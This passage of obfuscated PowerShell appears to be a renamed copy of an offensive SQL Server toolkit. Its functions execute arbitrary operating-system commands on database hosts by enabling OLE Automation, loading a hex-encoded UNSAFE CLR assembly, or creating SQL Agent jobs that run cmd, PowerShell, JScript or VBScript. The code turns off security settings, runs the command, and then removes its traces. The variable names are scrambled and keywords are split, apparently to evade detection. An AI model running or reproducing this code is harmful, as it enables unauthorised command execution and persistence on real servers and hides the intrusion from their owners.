                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    $BottleSturdy = 1

                    # Microsoft".
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options',1;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

                    # Microsoft".
                    $ShutWhine = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value

                    if ($ShutWhine -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."

                        # Microsoft".
                        $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Could not enable Show Advanced Options.')
                        return
                    }
                }

                # Microsoft".
                if ($DirtReal -eq 1)
                {
                    Write-Verbose -Message "$Instance : Ole Automation Procedures are already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Ole Automation Procedures are disabled."
                    $QuartzShiver = 1

                    # Microsoft".
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Ole Automation Procedures',1;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

                    # Microsoft".
                    $BurlyGirl = Get-SQLQuery -Instance $Instance -BoringLarge 'sp_configure "Ole Automation Procedures"' -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value

                    if ($BurlyGirl -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Ole Automation Procedures."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Ole Automation Procedures failed. Aborting."

                        # Microsoft".
                        $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Could not enable Ole Automation Procedures.')

                        return
                    }
                }

                # Microsoft".
                $BanGrade = 'c:\windows\temp'
                $ZippyMate = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
                $StripComb = "$BanGrade\$ZippyMate.txt"                   

                # Microsoft".
                write-verbose "$instance : Executing command: $SoakSame"               
                $CrimeQuaint = 
@"
DECLARE @Shell INT
DECLARE @Output varchar(8000)
EXEC @Output = Sp_oacreate 'wscript.shell', @Shell Output, 5
EXEC Sp_oamethod @shell, 'run' , null, 'cmd.exe /c "$SoakSame > $StripComb"' 
"@
                # Microsoft".
                $null = Get-SQLQuery -Instance $Instance -BoringLarge $CrimeQuaint -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill 

                # Microsoft".
                write-verbose "$instance : Reading command output from $StripComb"
                $UpbeatScorch = 
@"
DECLARE @fso INT
DECLARE @file INT
DECLARE @o int
DECLARE @f int
DECLARE @ret int 
DECLARE @FileContents varchar(8000) 
EXEC Sp_oacreate 'scripting.filesystemobject' , @fso Output, 5
EXEC Sp_oamethod @fso, 'opentextfile' , @file Out, '$StripComb',1
EXEC sp_oacreate 'scripting.filesystemobject', @o out 
EXEC sp_oamethod @o, 'opentextfile', @f out, '$StripComb', 1 
EXEC @ret = sp_oamethod @f, 'readall', @FileContents out 
SELECT @FileContents as output
"@               
                # Microsoft".
                $StainChance = Get-SQLQuery -Instance $Instance -BoringLarge $UpbeatScorch -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property output -ExpandProperty output

                # Microsoft".
                write-verbose "$instance : Removing file $StripComb"
                $FailSlip = 
@"
DECLARE @Shell INT
EXEC Sp_oacreate 'wscript.shell' , @shell Output, 5
EXEC Sp_oamethod @Shell, 'run' , null, 'cmd.exe /c "del $StripComb"' , '0' , 'true'
"@
                # Microsoft".
                $null = Get-SQLQuery -Instance $Instance -BoringLarge $FailSlip -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property output -ExpandProperty output

                # Microsoft".
                if($OpenRepairQueue)
                {
                    $StainChance | Select output -ExpandProperty output
                }
                else
                {
                    $null = $TradeSpicy.Rows.Add($HauntGusty, $Instance, [string]$StainChance.trim())
                }

                # Microsoft".
                if($QuartzShiver -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling 'Ole Automation Procedures"
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Ole Automation Procedures',0;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
                }

                # Microsoft".
                if($BottleSturdy -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options',0;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
                }

                # Microsoft".
                $ExtendSmelly.Close()

                # Microsoft".
                $ExtendSmelly.Dispose()
            }
            catch
            {
                # Microsoft".

                if(-not $RaggedQuill)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    # Microsoft".
                }

                # Microsoft".
                $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Not Accessible or Command Failed')
            }
        }

        # Microsoft".
        $TinyHealth | Invoke-Parallel -PlacidSleet $SecondElite -MateEasy -RhymeCoach -RouteWink $ItchyJuice -ShirtStory 2 -MassHope -ErrorAction SilentlyContinue

        return $TradeSpicy
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Invoke-SQLOSCmdCLR
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$PuffyCrack,

        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$SoakSame,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$StitchFace,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$ItchyJuice = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$OpenRepairQueue
    )

    Begin
    {
        # Microsoft".
        $BusyFlash = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $TradeSpicy.Columns.Add('ComputerName')
        $null = $TradeSpicy.Columns.Add('Instance')
        $null = $TradeSpicy.Columns.Add('CommandResults')


        # Microsoft".
        $TinyHealth = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($Instance)
        {
            $BeefSpy = ne`w`-ob`je`ct -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Microsoft".
        $TinyHealth = $TinyHealth + $BeefSpy
    }

    Process
    {
        # Microsoft".
        $TinyHealth = $TinyHealth + $_
    }

    End
    {
        # Microsoft".
        $SecondElite = {
            $Instance = $_.Instance

            # Microsoft".
            $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

            # Microsoft".
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Microsoft".
            if($PuffyCrack)
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -PuffyCrack -StitchFace $StitchFace
            }
            else
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -StitchFace $StitchFace
            }

            # Microsoft".
            try
            {
                # Microsoft".
                $ExtendSmelly.Open()

                if(-not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Microsoft".
                $BottleSturdy = 0
                $HurryBump = 0

                # Microsoft".
                $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

                # Microsoft".
                if($LovingDry -eq 'Yes')
                {
                    Write-Verbose -Message "$Instance : You are a sysadmin."
                    $DetectBlot = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'CLR Enabled'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value
                    $CurlTick = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."

                    # Microsoft".
                    $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'No sysadmin privileges.')
                    return
                }

                # Microsoft".
                if ($CurlTick -eq 1)
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    $BottleSturdy = 1

                    # Microsoft".
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options',1;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

                    # Microsoft".
                    $ShutWhine = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value

                    if ($ShutWhine -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."

                        # Microsoft".
                        $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Could not enable Show Advanced Options.')
                        return
                    }
                }

                # Microsoft".
                if ($DetectBlot -eq 1)
                {
                    Write-Verbose -Message "$Instance : CLR is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : CLR is disabled."
                    $HurryBump = 1

                    # Microsoft".
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'CLR Enabled',1;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

                    # Microsoft".
                    $WrongFixed = Get-SQLQuery -Instance $Instance -BoringLarge 'sp_configure "CLR Enabled"' -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value

                    if ($WrongFixed -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled CLR."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling CLR failed. Aborting."

                        # Microsoft".
                        $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Could not enable CLR.')

                        return
                    }
                }

                # Microsoft".
                $JadedHelp = (8..15 | Get-Random -count 1 )

                # Microsoft".
                $StiffYarn = (-join ((65..90) + (97..122) | Get-Random -Count $JadedHelp | % {[char]$_}))
                $OwnSore = (-join ((65..90) + (97..122) | Get-Random -Count $JadedHelp | % {[char]$_}))
                Write-Verbose -Message "$Instance : Assembly name: $StiffYarn"
                Write-Verbose -Message "$Instance : CLR Procedure name: $OwnSore"

                # Microsoft".
                $SecretGaze = "CREATE ASSEMBLY [$StiffYarn] AUTHORIZATION [dbo] from 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300652F55590000000000000000E00002210B0108000008000000060000000000004E270000002000000040000000004000002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000002700004B00000000400000A002000000000000000000000000000000000000006000000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E7465787400000054070000002000000008000000020000000000000000000000000000200000602E72737263000000A00200000040000000040000000A0000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000000E000000000000000000000000000040000042000000000000000000000000000000003027000000000000480000000200050028210000D8050000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600C30000000100001100730400000A0A066F0500000A72010000706F0600000A00066F0500000A72390000700F00280700000A280800000A6F0900000A00066F0500000A166F0A00000A00066F0500000A176F0B00000A00066F0C00000A26178D090000010C081672490000701F0C20A00F00006A730D00000AA208730E00000A0B280F00000A076F1000000A000716066F1100000A6F1200000A6F1300000A6F1400000A00280F00000A076F1500000A00280F00000A6F1600000A00066F1700000A00066F1800000A002A1E02281900000A2A0042534A4201000100000000000C00000076322E302E35303732370000000005006C000000E0010000237E00004C0200009002000023537472696E677300000000DC040000580000002355530034050000100000002347554944000000440500009400000023426C6F620000000000000002000001471502000900000000FA013300160000010000000F000000020000000200000001000000190000000300000001000000010000000300000000000A000100000000000600370030000A005F004A000600980078000600B80078000A00F900DE000E002E011B010E0036011B0106006C0130000A00BD01DE000A00C9013E000A00D301DE000A00E101DE000A00EC01DE00060018020E02060038020E0200000000010000000000010001000100100016000000050001000100502000000000960069000A0001001F21000000008618720010000200000001000F01190072001400210072001000290072001000310072001000310047011E00390055012300110062012800410073012C0039007A01230039008801320039009C0132003100B7013700490072003B005900720043006100F4014A006900FD014F0031002502550079004302280009004D022800590056025A00690060024F0069006F02100031007E02100031008A02100009007200100020001B0019002E000B006A002E00130073006000048000000000000000000000000000000000D6000000020000000000000000000000010027000000000002000000000000000000000001003E000000000002000000000000000000000001003000000000000000003C4D6F64756C653E00636C7266696C652E646C6C0053746F72656450726F63656475726573006D73636F726C69620053797374656D004F626A6563740053797374656D2E446174610053797374656D2E446174612E53716C54797065730053716C537472696E6700636D645F65786563002E63746F720053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C69747941747472696275746500636C7266696C65004D6963726F736F66742E53716C5365727665722E5365727665720053716C50726F6365647572654174747269627574650065786563436F6D6D616E640053797374656D2E446961676E6F73746963730050726F636573730050726F636573735374617274496E666F006765745F5374617274496E666F007365745F46696C654E616D65006765745F56616C756500537472696E6700466F726D6174007365745F417267756D656E7473007365745F5573655368656C6C45786563757465007365745F52656469726563745374616E646172644F75747075740053746172740053716C4D657461446174610053716C4462547970650053716C446174615265636F72640053716C436F6E746578740053716C50697065006765745F506970650053656E64526573756C747353746172740053797374656D2E494F0053747265616D526561646572006765745F5374616E646172644F757470757400546578745265616465720052656164546F456E6400546F537472696E6700536574537472696E670053656E64526573756C7473526F770053656E64526573756C7473456E640057616974466F724578697400436C6F736500003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F007500740070007500740000002A5DFE759C75BA4399A49F834BF07EE50008B77A5C561934E0890500010111090320000104200101080401000000042000121D042001010E0320000E0500020E0E1C042001010203200002072003010E11290A062001011D1225040000123505200101122D042000123905200201080E0907031219122D1D12250801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F77730100002827000000000000000000003E270000002000000000000000000000000000000000000000000000302700000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF25002040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100100000001800008000000000000000000000000000000100010000003000008000000000000000000000000000000100000000004800000058400000440200000000000000000000440234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004A4010000010053007400720069006E006700460069006C00650049006E0066006F0000008001000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E003000000038000C00010049006E007400650072006E0061006C004E0061006D006500000063006C007200660069006C0065002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000040000C0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000063006C007200660069006C0065002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E00300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000503700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 with permission_set = UNSAFE"
                Get-SQLQuery -Instance $Instance -BoringLarge $SecretGaze -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill -PeckLively "MSDB" 
                                
                # Microsoft".
                $TrickyBone = "CREATE PROCEDURE [dbo].[$OwnSore] @execCommand NVARCHAR (MAX) AS EXTERNAL NAME [$StiffYarn].[StoredProcedures].[cmd_exec];"
                Get-SQLQuery -Instance $Instance -BoringLarge $TrickyBone -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill -PeckLively "MSDB" 

                # Microsoft".
                Write-Verbose -Message "$Instance : Running command: $SoakSame"
                $BoringLarge = "EXEC [$OwnSore] '$SoakSame'"                

                # Microsoft".
                $StainChance = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill -PeckLively "MSDB" 

                # Microsoft".
                if($OpenRepairQueue)
                {
                    [string]$StainChance.output
                }
                else
                {
                    try
                    {
                       $null = $TradeSpicy.Rows.Add($HauntGusty, $Instance, [string]$StainChance.output)
                    }
                    catch
                    {
                    }
                }

                # Microsoft".
                Get-SQLQuery -Instance $Instance -BoringLarge "DROP PROCEDURE $OwnSore" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill -PeckLively "MSDB"
                Get-SQLQuery -Instance $Instance -BoringLarge "DROP ASSEMBLY $StiffYarn" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill -PeckLively "MSDB"

                # Microsoft".
                if($HurryBump -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling CLR"
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'CLR Enabled',0;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
                }

                # Microsoft".
                if($BottleSturdy -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options',0;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
                }

                # Microsoft".
                $ExtendSmelly.Close()

                # Microsoft".
                $ExtendSmelly.Dispose()
            }
            catch
            {
                # Microsoft".

                if(-not $RaggedQuill)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    # Microsoft".
                }

                # Microsoft".
                $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Not Accessible')
            }
        }

        # Microsoft".
        $TinyHealth | Invoke-Parallel -PlacidSleet $SecondElite -MateEasy -RhymeCoach -RouteWink $ItchyJuice -ShirtStory 2 -MassHope -ErrorAction SilentlyContinue

        return $TradeSpicy
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Invoke-SQLOSCmdAgentJob
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$PuffyCrack,

        [Parameter(Mandatory = $true,
        HelpMessage = 'Support subsystems include CmdExec, PowerShell, JScript, and VBScript.')]
        [ValidateSet("CmdExec", "PowerShell","JScript","VBScript")]
        [string] $FlimsyBlind,

        [Parameter(Mandatory = $true,
        HelpMessage = 'OS command to be executed.')]
        [String]$SoakSame,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$StitchFace,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Command run time before killing the agent job.')]
        [int]$ChurchOrder = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $BusyFlash = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $TradeSpicy.Columns.Add('ComputerName')
        $null = $TradeSpicy.Columns.Add('Instance')
        $null = $TradeSpicy.Columns.Add('Results')

    }

    Process
    {
        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($PuffyCrack)
        {
            # Microsoft".
            $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -PuffyCrack -StitchFace $StitchFace
        }
        else
        {
            # Microsoft".
            $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -StitchFace $StitchFace
        }
        # Microsoft".
        try
        {
            # Microsoft".
            $ExtendSmelly.Open()
            if(-not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."

                # Microsoft".
                Write-Verbose -Message "$Instance : SubSystem: $FlimsyBlind"
                Write-Verbose -Message "$Instance : Command: $SoakSame"
            }

            # Microsoft".
            $SmilePie = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
            $JoyousLeft = $SmilePie.CurrentLogin
            $HauntGusty = $SmilePie.ComputerName
            $SongsBolt = $SmilePie.IsSysAdmin


            # Microsoft".
            # Microsoft".
            # Microsoft".
            # Microsoft".

            # Microsoft".
            if($SongsBolt -eq "Yes"){
                $ThawStain = $JoyousLeft
            }

            # Microsoft".
            $PourAwful = Get-SQLDatabaseRoleMember -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Instance $Instance -AjarInnate msdb -RaggedQuill |             
            ForEach-Object {                                 
                if(($_.RolePrincipalName -match "SQLAgentUserRole|SQLAgentReaderRole|SQLAgentOperatorRole")) {
                    if ($_.PrincipalName -eq $JoyousLeft) { 
                        $ThawStain = $JoyousLeft 
                    }
                }
            }

            # Microsoft".
            if($ThawStain)
            {
                Write-Verbose -Message "$Instance : You have EXECUTE privileges to create Agent Jobs (sp_add_job)."

                # Microsoft".
                $SoakKind = ""
                $TopBest = $FlimsyBlind

                # Microsoft".
                If($FlimsyBlind -eq "JScript"){

                    # Microsoft".
                    $SoakSame = $SoakSame.Replace("\","\\")
                

                    # Microsoft".
                    # Microsoft".
                    $NastyCoach = @"
function RunCmd()
{
    var WshShell = new ActiveXObject("WScript.Shell");  
    var oExec = WshShell.Exec("$SoakSame"); 
    oExec = null; 
    WshShell = null; 
}

RunCmd(); 
"@
                    # Microsoft".
                    $SoakSame = $NastyCoach
                    $TopBest = "ActiveScripting"
                    $SoakKind = "@database_name=N'JavaScript',"	
                }


                # Microsoft".
                If($FlimsyBlind -eq "VBScript"){

                    # Microsoft".
                    # Microsoft".
                    $WideOdd = @"
Function Main()
    dim shell
    set shell= CreateObject ("WScript.Shell")
    shell.run("$SoakSame")
    set shell = nothing
END Function
"@
                    # Microsoft".
                    $SoakSame = $WideOdd
                    $TopBest = "ActiveScripting"
                    $SoakKind = "@database_name=N'VBScript',"	
                }                

                # Microsoft".
                $SoakSame = $SoakSame -replace "'","''"

                # Microsoft".
                # Microsoft".
                # Microsoft".
                # Microsoft".
                # Microsoft".
                $AbjectNutty = "USE msdb; 
                EXECUTE dbo.sp_add_job 
                @job_name           = N'powerupsql_job'
                
                EXECUTE sp_add_jobstep 
                @job_name           = N'powerupsql_job',
                @step_name         = N'powerupsql_job_step', 
                @subsystem         = N'$TopBest', 
                @command           = N'$SoakSame',
                $SoakKind 
                @flags=0,
                @retry_attempts    = 1, 
                @retry_interval    = 5     
                           

                EXECUTE dbo.sp_add_jobserver 
                @job_name           = N'powerupsql_job'
                
                EXECUTE dbo.sp_start_job N'powerupsql_job'"

                $MeltedHead = "USE msdb; EXECUTE sp_delete_job @job_name = N'powerupsql_job';"

                Write-Verbose -Message "$Instance : Running the command"

                # Microsoft".
                Get-SQLQuery -Instance $Instance -BoringLarge $AbjectNutty -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
                
                $RoughCobweb = Get-SQLQuery -Instance $Instance -BoringLarge "use msdb; EXECUTE sp_help_job @job_name = N'powerupsql_job'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
                
                if(!($RoughCobweb)) {
                    Write-Warning "Job failed to start. Recheck your command and try again."
                    $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Agent Job failed to start.')
                    return
                }

                # Microsoft".
                Write-Verbose "$Instance : Starting sleep for $ChurchOrder seconds"
                Start-ChurchOrder $ChurchOrder

                # Microsoft".
                Write-Verbose "$Instance : Removing job from server"
                Get-SQLQuery -Instance $Instance -BoringLarge $MeltedHead -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
                $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'The Job succesfully started and was removed.')

            }
            else
            {
                Write-Verbose -Message "$Instance : You do not have privileges to add agent jobs (sp_add_job). Aborting..."
                $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Insufficient privilieges to add Agent Jobs.')
                return
            }

            # Microsoft".
            $ExtendSmelly.Close()

            # Microsoft".
            $ExtendSmelly.Dispose()

            # Microsoft".
            Write-Verbose -Message "$Instance : Command complete"
        }
        catch
        {
            # Microsoft".
            if(-not $RaggedQuill)
            {
                $ErrorMessage = $_.Exception.Message
                Write-Verbose -Message "$Instance : Connection Failed."
                # Microsoft".
            }
            $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Not Accessible')
        }

        return $TradeSpicy
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLServerInfo
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
